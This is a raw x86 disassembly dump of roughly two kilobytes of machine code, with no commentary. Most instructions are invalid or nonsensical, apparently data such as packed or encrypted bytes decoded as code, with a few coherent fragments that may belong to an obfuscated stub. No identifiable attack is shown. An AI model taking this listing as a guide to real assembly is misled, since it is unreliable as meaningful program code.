  41001c:	shr    BYTE PTR [ecx],cl
  41001e:	push   ds
  41001f:	pop    edx
  410020:	xchg   edi,eax
  410021:	xor    ebp,DWORD PTR [ebx-0x3]
  410024:	mov    eax,ds:0x5c25a205
  410029:	xor    ebp,edi
  41002b:	gs push ss
  41002d:	inc    ecx
  41002e:	ror    DWORD PTR [ecx],1
  410030:	cs adc eax,0x753b402d
  410036:	dec    esi
  410037:	ss stc 
  410039:	cmp    BYTE PTR [esi-0x21263769],bl
  41003f:	das    
  410040:	ins    DWORD PTR es:[edi],dx
  410041:	inc    ebp
  410042:	mov    esp,0x968f20
  410047:	inc    esi
  410048:	lahf   
  410049:	cmp    dh,dl
  41004b:	push   esi
  41004c:	or     DWORD PTR [ecx],ebx
  41004e:	iret   
  41004f:	arpl   ax,bp
  410051:	out    dx,al
  410052:	jle    0x40fffe
  410054:	js     0x410058
  410056:	add    BYTE PTR [esi+0x16],dh
  410059:	xor    al,0x90
  41005b:	lock mov esi,0x30fca218
  410061:	adc    DWORD PTR [edx+eiz*4-0x21fd24db],0x14d7bd6f
  41006c:	lock loope 0x4100ae
  41006f:	pop    ds
  410070:	jno    0x4100a4
  410072:	cmp    ah,bl
  410074:	push   eax
  410075:	into   
  410076:	and    edx,esp
  410078:	clc    
  410079:	add    al,0xc6
  41007b:	in     al,0x7b
  41007d:	push   eax
  41007e:	mov    edx,0xb7bb22ed
  410083:	addr16 dec eax
  410085:	push   edx
  410086:	inc    ebp
  410087:	les    edx,FWORD PTR [eax+0x6f]
  41008a:	mov    ah,0x3c
  41008c:	add    BYTE PTR ds:0xbf06e477,ah
  410092:	aam    0x4f
  410094:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410095:	out    0x30,eax
  410097:	fdivr  DWORD PTR [ecx+0x43]
  41009a:	sub    esp,DWORD PTR [esi]
  41009c:	jo     0x4100a4
  41009e:	repz xchg edi,eax
  4100a0:	jno    0x410031
  4100a2:	cdq    
  4100a3:	sbb    cl,BYTE PTR [eax-0x56005667]
  4100a9:	mov    ds:0x5cf6d6ea,eax
  4100ae:	fild   DWORD PTR ds:0xc6aed348
  4100b4:	mov    bh,0xf
  4100b6:	sub    bh,dh
  4100b8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4100b9:	aas    
  4100ba:	xchg   ebx,eax
  4100bb:	(bad)  
  4100bd:	inc    edi
  4100be:	xchg   esi,eax
  4100bf:	sar    DWORD PTR [esi-0x7585772a],1
  4100c5:	ja     0x410077
  4100c7:	push   esi
  4100c8:	in     al,dx
  4100c9:	inc    ebp
  4100ca:	daa    
  4100cb:	and    edi,esi
  4100cd:	xor    al,0x19
  4100cf:	xor    ebx,DWORD PTR [eax+0x619781ff]
  4100d5:	popf   
  4100d6:	xlat   BYTE PTR ds:[ebx]
  4100d7:	scas   eax,DWORD PTR es:[edi]
  4100d8:	inc    ebp
  4100d9:	call   DWORD PTR [edi+0x10a18eca]
  4100df:	movzx  ebx,BYTE PTR [edi-0x47]
  4100e3:	xor    DWORD PTR [edx],0xc8f86c21
  4100e9:	mov    bh,0xa2
  4100eb:	add    BYTE PTR [edx-0x5b],bl
  4100ee:	mov    ecx,0x3b414572
  4100f3:	push   0x5a86caee
  4100f8:	mov    eax,0x2b99e263
  4100fd:	aas    
  4100fe:	repz sar ah,1
  410101:	test   BYTE PTR [edi+0x68],cl
  410104:	push   ebx
  410105:	imul   edi,ebp,0x611f5b19
  41010b:	jl     0x41018c
  41010d:	pmaddwd mm7,QWORD PTR [edx-0x149147c1]
  410114:	out    0x40,eax
  410116:	(bad)  
  410117:	sbb    al,0x8b
  410119:	jns    0x4100f3
  41011b:	push   ebx
  41011c:	cmp    dl,BYTE PTR [ebp+0x55607ab6]
  410122:	mov    al,BYTE PTR [eax-0x5efc6a02]
  410128:	sbb    dh,BYTE PTR [ebx+0x6178788f]
  41012e:	adc    ebp,DWORD PTR [ebx-0x58154e6b]
  410134:	dec    eax
  410135:	push   ss
  410136:	mov    ch,0x8d
  410138:	ret    0x3232
  41013b:	jecxz  0x41017d
  41013d:	sti    
  41013e:	mov    ebp,ebx
  410140:	xchg   DWORD PTR [edi],edx
  410142:	loope  0x4100ca
  410144:	sub    BYTE PTR [eax-0x57331a78],dh
  41014a:	dec    ebp
  41014b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41014c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41014d:	push   0xffffffa6
  41014f:	cmp    edi,ebx
  410151:	in     eax,dx
  410152:	out    0xdf,al
  410154:	gs push edi
  410156:	fidiv  DWORD PTR [ebx+eiz*2+0x28]
  41015a:	or     eax,0x14882a6c
  41015f:	js     0x41013f
  410161:	fisubr WORD PTR [esi-0x6f08325f]
  410167:	add    edx,DWORD PTR [edi-0x61e576d1]
  41016d:	sub    cl,BYTE PTR [ecx]
  41016f:	jmp    0xc809:0x7ed2d4c8
  410176:	adc    BYTE PTR [ecx+0x28572925],dh
  41017c:	mov    edx,0xdbc57b59
  410181:	mov    bh,0x2d
  410183:	and    esp,DWORD PTR ds:[ecx-0x5218ae33]
  41018a:	push   ebx
  41018b:	jmp    0x4101b9
  41018d:	mov    edx,0x7e10eb39
  410192:	jbe    0x410140
  410194:	clc    
  410195:	stc    
  410196:	dec    esi
  410197:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410198:	adc    ecx,ecx
  41019a:	push   eax
  41019b:	sbb    eax,0xa3204505
  4101a0:	cmp    al,0xe7
  4101a2:	sbb    bh,BYTE PTR [ebx]
  4101a4:	ret    
  4101a5:	or     esi,esi
  4101a7:	(bad)  
  4101a8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4101a9:	xor    dl,BYTE PTR [edi-0x77]
  4101ac:	jle    0x4101bb
  4101ae:	jne    0x4101c2
  4101b0:	add    edx,DWORD PTR [eax]
  4101b2:	xor    eax,0x48cf1dab
  4101b7:	arpl   WORD PTR [ebp-0x27],cx
  4101ba:	int3   
  4101bb:	push   eax
  4101bc:	fimul  WORD PTR [eax-0x42]
  4101bf:	xchg   edi,eax
  4101c0:	mov    edx,0x286a67a3
  4101c5:	mov    eax,ds:0x5ae4ffd0
  4101ca:	ja     0x41014d
  4101cc:	push   0x5a
  4101ce:	mov    bl,0x64
  4101d0:	lds    esp,FWORD PTR [ecx+eax*4]
  4101d3:	ret    
  4101d4:	sbb    eax,0x2776f01d
  4101d9:	into   
  4101da:	or     BYTE PTR [ecx-0x7cc8c63b],dh
  4101e0:	fwait
  4101e1:	jns    0x4101cd
  4101e3:	jbe    0x4101f1
  4101e5:	dec    esi
  4101e6:	sahf   
  4101e7:	or     al,0xb2
  4101e9:	cvtdq2ps xmm0,xmm2
  4101ec:	push   es
  4101ed:	lahf   
  4101ee:	jge    0x41017a
  4101f0:	fiadd  WORD PTR [eax]
  4101f2:	xor    DWORD PTR [eax-0x2aa66ae5],esi
  4101f8:	pop    ds
  4101f9:	push   ebp
  4101fa:	mov    esp,0xea1cc92f
  4101ff:	mov    ebx,fs
  410201:	in     al,0x2a
  410203:	rol    bl,0x3f
  410206:	ss mov eax,0x1621014
  41020c:	int    0x9d
  41020e:	xchg   ebp,eax
  41020f:	or     ebx,DWORD PTR [ebp-0x65]
  410212:	push   cs
  410213:	mov    ebx,0xa85184ef
  410218:	les    ebx,FWORD PTR [ebx+0xf6bba03]
  41021e:	sbb    eax,DWORD PTR [edi]
  410220:	mov    bl,0x20
  410222:	cwde   
  410223:	mov    cl,0x77
  410225:	leave  
  410226:	and    ecx,ecx
  410228:	fwait
  410229:	inc    edx
  41022a:	shl    DWORD PTR [eax+0x7f6b3236],0xf
  410231:	adc    al,0xfd
  410233:	fistp  WORD PTR [edi]
  410235:	(bad)  
  410236:	xor    ecx,DWORD PTR [edx-0x24]
  410239:	adc    dl,BYTE PTR [eax+0x7c]
  41023c:	stos   DWORD PTR es:[edi],eax
  41023d:	test   DWORD PTR [esp+ebx*2+0x5809d227],0x6621f45
  410248:	mov    ah,0xd3
  41024a:	icebp  
  41024b:	es push edi
  41024d:	jl     0x41027a
  41024f:	cld    
  410250:	mov    ds:0xdff4ae09,al
  410255:	outs   dx,BYTE PTR ds:[esi]
  410256:	adc    BYTE PTR [ebp+0x4eac22f1],dl
  41025c:	mov    ah,0x7f
  41025e:	mov    esi,0xc4b596a3
  410263:	push   edx
  410264:	inc    edx
  410265:	and    al,0x5
  410267:	push   ds
  410268:	rol    DWORD PTR [ebx-0x3b],cl
  41026b:	(bad)  
  41026c:	jae    0x4102a6
  41026e:	outs   dx,BYTE PTR ds:[esi]
  41026f:	xor    eax,0x80b03fa0
  410274:	push   eax
  410275:	jge    0x41020b
  410277:	cmp    BYTE PTR [ecx],0xc
  41027a:	dec    ecx
  41027b:	fmul   DWORD PTR [eax]
  41027d:	imul   eax,DWORD PTR fs:[edi+0x6be65294],0x66
  410285:	pop    edx
  410286:	adc    DWORD PTR ds:0x5fa196b7,ebp
  41028c:	stos   BYTE PTR es:[edi],al
  41028d:	xor    edx,ebx
  41028f:	push   esi
  410290:	iret   
  410291:	jb     0x4102c4
  410293:	dec    ebp
  410294:	jns    0x41027e
  410296:	dec    esp
  410297:	loop   0x4102a6
  410299:	and    ch,bl
  41029b:	in     eax,dx
  41029c:	mov    ebx,0x9089a082
  4102a1:	mov    ds:0x3991f47c,al
  4102a6:	dec    edx
  4102a7:	add    bh,BYTE PTR [esi+0x2de4a3ad]
  4102ad:	pop    esi
  4102ae:	sbb    DWORD PTR [edi],ecx
  4102b0:	lahf   
  4102b1:	addr16 dec ecx
  4102b3:	xor    BYTE PTR [esi+0x7f],ch
  4102b6:	jne    0x410300
  4102b8:	xor    dl,BYTE PTR [esi]
  4102ba:	sub    edx,esp
  4102bc:	dec    ecx
  4102bd:	mov    cl,0xb3
  4102bf:	repz jmp 0xf98c6b3d
  4102c5:	inc    esp
  4102c6:	test   eax,0x747de8f0
  4102cb:	xchg   edi,eax
  4102cc:	sub    bh,BYTE PTR [ecx]
  4102ce:	jecxz  0x410276
  4102d0:	mov    al,0x18
  4102d2:	add    al,0x95
  4102d4:	imul   eax,DWORD PTR [esi],0x1cc98483
  4102da:	push   esp
  4102db:	sub    ecx,eax
  4102dd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4102de:	les    eax,FWORD PTR [esi+0x2b]
  4102e1:	sbb    DWORD PTR [eax],0x9335b0e7
  4102e7:	pop    ebx
  4102e8:	(bad)  
  4102e9:	out    0xd,al
  4102eb:	push   ss
  4102ec:	and    BYTE PTR [ecx],dh
  4102ee:	stos   DWORD PTR es:[edi],eax
  4102ef:	cmp    al,bl
  4102f1:	out    0x55,eax
  4102f3:	pop    esp
  4102f4:	lds    ebp,FWORD PTR ds:0x936fc833
  4102fa:	or     dl,dh
  4102fc:	jle    0x4102c8
  4102fe:	adc    DWORD PTR [eax+0x494affb9],ebx
  410304:	fsub   DWORD PTR [esi+0x3a]
  410307:	jbe    0x410342
  410309:	dec    ebx
  41030a:	add    bh,BYTE PTR [esi]
  41030c:	pop    ecx
  41030d:	dec    ebx
  41030e:	jp     0x410295
  410310:	sbb    DWORD PTR [ecx+0x53],edi
  410313:	pop    ecx
  410314:	push   ebp
  410315:	mov    ebx,0xe87642c3
  41031a:	(bad)  
  41031b:	pop    esp
  41031c:	pop    sp
  41031e:	xor    ebp,DWORD PTR [edi+0x2def26ed]
  410324:	mov    al,0x32
  410326:	daa    
  410327:	les    ebp,FWORD PTR [eax]
  410329:	lea    ebx,[esi]
  41032b:	je     0x410329
  41032d:	int    0x7
  41032f:	adc    edx,edx
  410331:	sbb    eax,0x8643c993
  410336:	jae    0x4102cd
  410338:	out    0x1e,eax
  41033a:	imul   bh
  41033c:	xor    dh,BYTE PTR [ebx-0x1b]
  41033f:	iret   
  410340:	jecxz  0x41037c
  410342:	das    
  410343:	push   0x3c
  410345:	mov    WORD PTR [ebp-0x7e],es
  410348:	mov    BYTE PTR [edx],al
  41034a:	inc    ebp
  41034b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41034c:	pushf  
  41034d:	std    
  41034e:	xor    al,0x45
  410350:	pop    esi
  410351:	push   eax
  410352:	xchg   DWORD PTR [ebp-0x36],eax
  410355:	or     eax,0xa4139dbd
  41035a:	add    DWORD PTR [ebx],ebp
  41035c:	neg    dl
  41035e:	fadd   QWORD PTR [ecx+eax*2+0x74]
  410362:	loop   0x41037f
  410364:	cmp    DWORD PTR ds:0xd0b50f3,eax
  41036a:	jmp    0x4103ba
  41036c:	add    BYTE PTR [edi-0x585aaa93],ch
  410372:	mov    esp,?
  410374:	inc    ebx
  410375:	loopne 0x41033f
  410377:	fisubr WORD PTR [ecx]
  410379:	jb     0x4103eb
  41037b:	hlt    
  41037c:	addr16 push 0x69b3b6da
  410382:	sub    DWORD PTR [esi+0x30],esi
  410385:	in     al,0xde
  410387:	sub    al,0xf2
  410389:	cmp    BYTE PTR [ebx-0x68],ch
  41038c:	push   cs
  41038d:	jno    0x410389
  41038f:	push   cs
  410390:	pop    edi
  410391:	pop    esi
  410392:	push   0x4d890a0f
  410397:	or     BYTE PTR ds:0x2082,al
  41039d:	mov    eax,DWORD PTR [ebp-0x4]
  4103a0:	mov    ecx,DWORD PTR ds:0x42fe05
  4103a6:	add    ecx,DWORD PTR ds:0x42fe09
  4103ac:	mov    DWORD PTR ds:0x42fe05,ecx
  4103b2:	xor    eax,edx
  4103b4:	sub    DWORD PTR ds:0x42e21c,ebx
  4103ba:	push   esi
  4103bb:	sbb    ecx,ecx
  4103bd:	jmp    0x410787
  4103c2:	lods   al,BYTE PTR ds:[esi]
  4103c3:	das    
  4103c4:	mov    ds:0xaa91a114,al
  4103c9:	mov    bh,0x91
  4103cb:	call   0xf533:0x9e0bbab6
  4103d2:	pop    eax
  4103d3:	mov    edx,0x7da37070
  4103d8:	jo     0x41044a
  4103da:	stc    
  4103db:	dec    ebp
  4103dc:	retf   
  4103dd:	in     al,0x6a
  4103df:	ds mov al,0xd2
  4103e2:	mov    ah,0x7f
  4103e4:	pop    esp
  4103e5:	(bad)  
  4103e6:	addr16 test eax,0x809741f8
  4103ec:	push   esp
  4103ed:	aaa    
  4103ee:	sbb    eax,DWORD PTR [esi+0x5cd4d518]
  4103f4:	jnp    0x410439
  4103f6:	mov    al,ds:0xbd184ff7
  4103fb:	or     ah,BYTE PTR [edi-0x2b7f38c3]
  410401:	or     ecx,DWORD PTR [edx+0x4c]
  410404:	aaa    
  410405:	popf   
  410406:	and    DWORD PTR [edi],ebx
  410408:	push   ebx
  410409:	jg     0x410453
  41040b:	xor    DWORD PTR [eax],edx
  41040d:	or     eax,0x990fcbc5
  410412:	or     edi,eax
  410414:	or     al,0xb5
  410416:	mov    esp,0xbb990cb
  41041b:	sbb    bh,0x74
  41041e:	dec    ebp
  41041f:	and    eax,0xa3e1ee91
  410424:	jl     0x4103b0
  410426:	fcmovnu st,st(1)
  410428:	jne    0x4103c9
  41042a:	inc    ecx
  41042b:	push   edi
  41042c:	cmp    DWORD PTR [ebx-0x62ed555c],0x3f
  410433:	mov    ebp,0x87ef8798
  410438:	fistp  QWORD PTR [ebx+0x71]
  41043b:	pop    ss
  41043c:	pop    ss
  41043d:	xor    dl,0x4e
  410440:	outs   dx,BYTE PTR ds:[esi]
  410441:	sub    eax,0x6c5d8b46
  410446:	fisubr DWORD PTR ds:0xf6a788bf
  41044c:	push   esp
  41044d:	xor    DWORD PTR [edi-0x20],ebx
  410450:	sub    BYTE PTR [ecx+0xdadc9c8],ah
  410456:	adc    al,0x98
  410458:	sub    ecx,DWORD PTR [esi+0x4a1d3e01]
  41045e:	jne    0x410461
  410460:	addr16 jne 0x410493
  410463:	mov    bl,0x3b
  410465:	inc    ecx
  410466:	xchg   DWORD PTR [edi-0x69],ebp
  410469:	call   0x820e:0xa682fb95
  410470:	add    al,0x4c
  410472:	dec    BYTE PTR [ebx+0x6fcb62dd]
  410478:	int    0xa2
  41047a:	mov    esi,0x695c3c10
  41047f:	enter  0x4411,0xf
  410483:	and    DWORD PTR [edx+0x61],ebp
  410486:	add    eax,0x409cf309
  41048b:	adc    BYTE PTR [eax-0x10],dl
  41048e:	pusha  
  41048f:	xchg   ebp,eax
  410490:	push   eax
  410491:	in     eax,dx
  410492:	mov    cl,BYTE PTR [edi+0x50]
  410495:	sbb    esp,ebp
  410497:	sub    ebx,DWORD PTR [ebx+0x41]
  41049a:	inc    ebx
  41049b:	pop    ss
  41049c:	(bad)  [edx]
  41049e:	test   eax,0x86ee9166
  4104a3:	and    DWORD PTR [eax],0x9779eb51
  4104a9:	push   esi
  4104aa:	int    0xa6
  4104ac:	xchg   ebp,eax
  4104ad:	xor    DWORD PTR [esi],ecx
  4104af:	hlt    
  4104b0:	inc    ecx
  4104b1:	stos   BYTE PTR es:[edi],al
  4104b2:	xchg   ebp,eax
  4104b3:	sub    dl,bl
  4104b5:	pop    esi
  4104b6:	(bad)  
  4104b7:	pusha  
  4104b8:	je     0x4104f7
  4104ba:	(bad)  
  4104bb:	pop    esp
  4104bc:	repnz xchg esi,eax
  4104be:	idiv   DWORD PTR [ebx]
  4104c0:	sbb    al,0x21
  4104c2:	xchg   ebx,eax
  4104c3:	cdq    
  4104c4:	cs stos BYTE PTR es:[edi],al
  4104c6:	(bad)  
  4104c8:	iret   
  4104c9:	inc    edi
  4104ca:	repnz rcr DWORD PTR [esi+esi*2+0x55],cl
  4104cf:	cmp    bl,ch
  4104d1:	es jns 0x410510
  4104d4:	(bad)  
  4104d5:	jge    0x41053d
  4104d7:	(bad)  
  4104d8:	cli    
  4104d9:	push   ecx
  4104da:	dec    ecx
  4104db:	into   
  4104dc:	and    eax,0x6774234f
  4104e1:	cmp    al,BYTE PTR [ebp-0x62]
  4104e4:	jnp    0x410560
  4104e6:	(bad)  
  4104e7:	(bad)  
  4104e8:	mov    bh,0xd9
  4104ea:	cmc    
  4104eb:	xlat   BYTE PTR ds:[ebx]
  4104ec:	add    eax,0x5d8bc298
  4104f1:	xlat   BYTE PTR ds:[ebx]
  4104f2:	fidivr WORD PTR [edi+0x77]
  4104f5:	jecxz  0x41053b
  4104f7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4104f8:	loop   0x41055e
  4104fa:	repz retf 0xa355
  4104fe:	dec    ebx
  4104ff:	jnp    0x4104fa
  410501:	adc    BYTE PTR [eax+0x61],0xbd
  410505:	pop    esp
  410506:	or     cl,BYTE PTR [eax+0x3a]
  410509:	cmp    BYTE PTR [edi+0x30],bl
  41050c:	icebp  
  41050d:	clc    
  41050e:	into   
  41050f:	push   cs
  410510:	inc    edx
  410511:	in     al,dx
  410512:	shl    DWORD PTR [eax],0xa9
  410515:	push   ebx
  410516:	imul   ebp,ebp,0x38259a6a
  41051c:	sti    
  41051d:	aad    0x4a
  41051f:	fadd   st,st(6)
  410521:	rol    ebp,cl
  410523:	sub    ebx,ebp
  410525:	add    BYTE PTR [edx-0x7c6e4fa1],ch
  41052b:	out    0x51,eax
  41052d:	jo     0x41053d
  41052f:	in     eax,0x38
  410531:	mov    ebx,0xc7b3033f
  410536:	sbb    al,0x40
  410538:	int    0xb1
  41053a:	(bad)  
  41053b:	test   eax,0x91ee22d1
  410540:	and    bh,bh
  410542:	mov    esi,ebx
  410544:	xor    edi,DWORD PTR ss:[ebx+0xf5f9f5d]
  41054b:	jae    0x4104e7
  41054d:	mov    dh,BYTE PTR [ecx+0x67]
  410550:	jb     0x4105c0
  410552:	cmp    edx,DWORD PTR [ebx]
  410554:	mov    esi,0x7a61e0ec
  410559:	out    dx,eax
  41055a:	aam    0x26
  41055c:	arpl   WORD PTR [edi-0xde2ec16],di
  410562:	inc    esp
  410563:	int3   
  410564:	xor    eax,0x91d55392
  410569:	fisub  WORD PTR [ecx-0x35]
  41056c:	jmp    0x1f39:0x140f98b
  410573:	xor    eax,0xa7f29d7b
  410578:	std    
  410579:	in     eax,dx
  41057a:	out    dx,al
  41057b:	lock push edi
  41057d:	fidiv  WORD PTR [eax]
  41057f:	cmp    edx,DWORD PTR [bx+di]
  410582:	push   ebp
  410583:	imul   ecx,DWORD PTR [ebx+0xb9ec011],0x67
  41058a:	xchg   ebp,eax
  41058b:	sbb    al,0x39
  41058d:	jae    0x410516
  41058f:	(bad)  
  410590:	cbw    
  410592:	repnz push ds
  410594:	idiv   BYTE PTR [eax+0x1a]
  410597:	lds    eax,FWORD PTR [ebx]
  410599:	rcl    BYTE PTR [ebx-0x5e370421],0x81
  4105a0:	xchg   DWORD PTR ds:0x2fecf268,ecx
  4105a6:	mov    BYTE PTR [edx],0xc9
  4105a9:	dec    ebp
  4105aa:	dec    ebx
  4105ab:	call   0x9a088dc0
  4105b0:	sbb    dh,al
  4105b2:	jle    0x41055c
  4105b4:	xor    ah,dl
  4105b6:	stos   DWORD PTR es:[edi],eax
  4105b7:	stc    
  4105b8:	push   ecx
  4105b9:	xor    ah,al
  4105bb:	or     esi,ecx
  4105bd:	icebp  
  4105be:	jp     0x4105ec
  4105c0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4105c1:	lods   al,BYTE PTR ds:[esi]
  4105c2:	aas    
  4105c3:	fiadd  WORD PTR [edi+0x72]
  4105c6:	pop    es
  4105c7:	fmul   DWORD PTR [ebx+0x554b01be]
  4105cd:	lds    esi,FWORD PTR [edx+0x3122c5a9]
  4105d3:	iret   
  4105d4:	add    al,0xdb
  4105d6:	dec    esi
  4105d7:	jnp    0x410607
  4105d9:	jecxz  0x4105a2
  4105db:	push   ss
  4105dc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4105dd:	xchg   ebx,eax
  4105de:	jae    0x410600
  4105e0:	out    dx,al
  4105e1:	dec    esp
  4105e2:	daa    
  4105e3:	mov    ds:0xd37d44d,al
  4105e8:	imul   DWORD PTR [ecx-0x64]
  4105eb:	mov    BYTE PTR [ebp+0x6d],dl
  4105ee:	jb     0x4105a3
  4105f0:	cdq    
  4105f1:	jle    0x4105fe
  4105f3:	ja     0x4105fd
  4105f5:	shr    ah,1
  4105f7:	sbb    ecx,DWORD PTR [edi-0x15d13137]
  4105fd:	jecxz  0x41059f
  4105ff:	paddq  mm4,mm3
  410602:	(bad)  
  410603:	in     al,dx
  410604:	push   0x848df67e
  410609:	cwde   
  41060a:	mov    DWORD PTR [eax+eax*1-0x1e],ebx
  41060e:	jbe    0xc4bee46b
  410614:	jp     0x4105eb
  410616:	jns    0x41068e
  410618:	or     al,0x94
  41061a:	fs addr16 dec edx
  41061d:	clc    
  41061e:	jg     0x410690
  410620:	mov    edi,0x4794fa32
  410625:	jae    0x410649
  410627:	mov    eax,0xd21e41a5
  41062c:	in     al,0x5f
  41062e:	mov    edi,0xe0b989c3
  410633:	jg     0x41068c
  410635:	cmp    DWORD PTR [esi],esi
  410637:	fnstsw WORD PTR [ebx+0x4]
  41063a:	cmp    BYTE PTR ds:[ecx],bh
  41063d:	imul   edx,DWORD PTR [edx+0x1],0xffffff9b
  410641:	ss rcl esi,cl
  410644:	mov    ah,BYTE PTR [edi+0x3b99df04]
  41064a:	dec    eax
  41064b:	pop    ds
  41064c:	outs   dx,BYTE PTR ds:[esi]
  41064d:	inc    eax
  41064e:	out    dx,eax
  41064f:	sti    
  410650:	in     eax,dx
  410651:	cmp    eax,0x8f8f97ca
  410656:	adc    BYTE PTR [edx],bl
  410658:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410659:	mov    bl,0x8
  41065b:	push   ebx
  41065c:	ror    BYTE PTR [ecx-0x5e2776a7],cl
  410662:	aam    0x61
  410664:	loope  0x41069a
  410666:	sub    cl,BYTE PTR [ebp-0x5723e7b8]
  41066c:	rcr    DWORD PTR ds:[esi+0x40eb872c],1
  410673:	mov    ebp,0x5f3208ef
  410678:	push   cs
  410679:	ds or  edi,ecx
  41067c:	cdq    
  41067d:	mov    ?,WORD PTR [ecx]
  41067f:	sub    eax,0x36d10759
  410684:	popa   
  410685:	fistp  DWORD PTR [ecx-0x648e982f]
  41068b:	xor    ch,ah
  41068d:	fisttp DWORD PTR ds:0x967581c2
  410693:	jb     0x410696
  410695:	push   0x96908028
  41069a:	dec    ebp
  41069b:	je     0x41063c
  41069d:	pop    esp
  41069e:	ror    BYTE PTR [esi-0x37966459],cl
  4106a4:	mov    esi,0xf6129f4d
  4106a9:	fisttp WORD PTR ds:[ebp-0x17]
  4106ad:	mov    dl,0x33
  4106af:	sub    BYTE PTR [edx],al
  4106b1:	xchg   DWORD PTR [ecx-0x10],eax
  4106b4:	(bad)  
  4106b5:	mov    dh,0xd
  4106b7:	int3   
  4106b8:	test   al,0xe2
  4106ba:	sub    al,0x9
  4106bc:	pop    ss
  4106bd:	fcos   
  4106bf:	aad    0x9e
  4106c1:	adc    BYTE PTR [ecx+0x4414ff6d],bl
  4106c7:	out    dx,eax
  4106c8:	iret   
  4106c9:	hlt    
  4106ca:	(bad)  
  4106cb:	fisub  WORD PTR [ebp+0x7db048b2]
  4106d1:	pop    esp
  4106d2:	in     al,0xe
  4106d4:	leave  
  4106d5:	test   al,0x34
  4106d7:	push   ecx
  4106d8:	or     al,0x6
  4106da:	jmp    0xddfd6856
  4106df:	cmc    
  4106e0:	cmp    BYTE PTR [edx+0x65],cl
  4106e3:	xor    DWORD PTR [ebx+eiz*4-0x68],ebx
  4106e7:	mov    esi,0x11a7581d
  4106ec:	jg     0x410705
  4106ee:	pop    esi
  4106ef:	int    0xce
  4106f1:	dec    edx
  4106f2:	xor    BYTE PTR [edx+0xdb17cdc],bl
  4106f8:	repz xchg esp,eax
  4106fa:	nop
  4106fb:	in     al,dx
  4106fc:	pop    edx
  4106fd:	nop    DWORD PTR [ebx]
  410700:	rcl    DWORD PTR [eax],0xf1
  410703:	jno    0x410751
  410705:	lods   eax,DWORD PTR ds:[esi]
  410706:	cmp    dl,BYTE PTR [edi]
  410708:	(bad)  
  410709:	jmp    0x39c8588c
  41070e:	pop    ebx
  41070f:	xchg   edi,eax
  410710:	pop    edx
  410711:	mov    ah,0x39
  410713:	hlt    
  410714:	inc    esp
  410715:	xchg   al,bh
  410717:	sbb    eax,0xc2c76fc3
  41071c:	aam    0xb
  41071e:	and    dl,BYTE PTR [edi-0x7f]
  410721:	inc    ecx
  410722:	pop    ecx
  410723:	loopne 0x4106b7
  410725:	pop    esp
  410726:	rol    esp,cl
  410728:	push   eax
  410729:	and    cl,al
  41072b:	test   eax,0x1cd1aa16
  410730:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410731:	inc    esp
  410732:	cmp    DWORD PTR [esi-0x6f],esi
  410735:	call   0x6315b936
  41073a:	sub    DWORD PTR [ebx+0x6b],ecx
  41073d:	add    dl,BYTE PTR [esi-0x45]
  410740:	cs call 0x807e96f4
  410746:	xor    dh,bl
  410748:	and    eax,0xec941cde
  41074d:	adc    BYTE PTR [edx],0x74
  410750:	lahf   
  410751:	xor    DWORD PTR [edi+esi*4+0xa],edx
  410755:	mov    ch,0x35
  410757:	and    eax,0x1a0ab207
  41075c:	dec    ebp
  41075d:	int    0x5d
  41075f:	ret    
  410760:	in     eax,dx
  410761:	cmp    ch,bh
  410763:	out    dx,eax
  410764:	inc    ebx
  410765:	ret    
  410766:	loope  0x4107c4
  410768:	jl     0x41076c
  41076a:	sti    
  41076b:	jp     0x410743
  41076d:	mov    bh,0xbc
  41076f:	sub    BYTE PTR [ecx],0x50
  410772:	scas   eax,DWORD PTR es:[edi]
  410773:	outs   dx,DWORD PTR ds:[esi]
  410774:	sub    BYTE PTR [esi+0x34],ch
  410777:	and    al,0x83
  410779:	pop    ecx
  41077a:	adc    al,0xc2
  41077c:	imul   ecx,DWORD PTR [edi],0x453cdaf3
  410782:	pop    eax
  410783:	das    
  410784:	xchg   esi,eax
  410785:	mov    dl,0xf1
  410787:	mov    esi,DWORD PTR [ebp+0x8]
  41078a:	sbb    ecx,0x2f26
  410790:	mov    ecx,0x32729c
  410795:	add    eax,ecx
  410797:	jmp    0x410b61
  41079c:	outs   dx,DWORD PTR ds:[esi]
  41079d:	mov    ebp,ds
  41079f:	or     al,0xd9
  4107a1:	imul   ebp,DWORD PTR [ecx+0x6b],0x19f67ea1
  4107a8:	xor    edi,ecx
  4107aa:	jo     0x41077a
  4107ac:	mov    eax,DWORD PTR [esi+0x70]
  4107af:	jo     0x410754
  4107b1:	jge    0x410823
  4107b3:	jo     0x410834
  4107b5:	xchg   ecx,eax
  4107b6:	outs   dx,BYTE PTR ds:[esi]
  4107b7:	sub    dh,BYTE PTR [edx+0x683be121]
  4107bd:	adc    DWORD PTR [ecx],ebx
  4107bf:	mov    bh,dh
  4107c1:	mov    edx,0xdf18c1e2
  4107c6:	repnz push ss
  4107c8:	pop    ebx
  4107c9:	adc    al,BYTE PTR [edx-0x5e82ce65]
  4107cf:	dec    ecx
  4107d0:	shl    BYTE PTR [eax+0x7c6eb23a],cl
  4107d6:	popf   
  4107d7:	int    0xa3
  4107d9:	enter  0x44b1,0x9e
  4107dd:	mov    ecx,0x3e5eac7c
  4107e2:	cld    
  4107e3:	jbe    0x41083e
  4107e5:	call   0x7248:0xa0fe612b
  4107ec:	fs sbb esi,edi
  4107ef:	out    0xc9,eax
  4107f1:	or     al,0xeb
  4107f3:	imul   esi,DWORD PTR [edx],0xffffffd6
  4107f6:	pop    ecx
  4107f7:	inc    esp
  4107f8:	pop    edi
  4107f9:	mov    esi,0x751aca43
  4107fe:	shr    BYTE PTR [edi-0x5dc51102],1
  410804:	jo     0x4107e7
  410806:	pop    esp
  410807:	jne    0x41078c
  410809:	xor    al,0x3b
  41080b:	je     0x410847
  41080d:	das    
  41080e:	add    eax,0xfb94e4fa
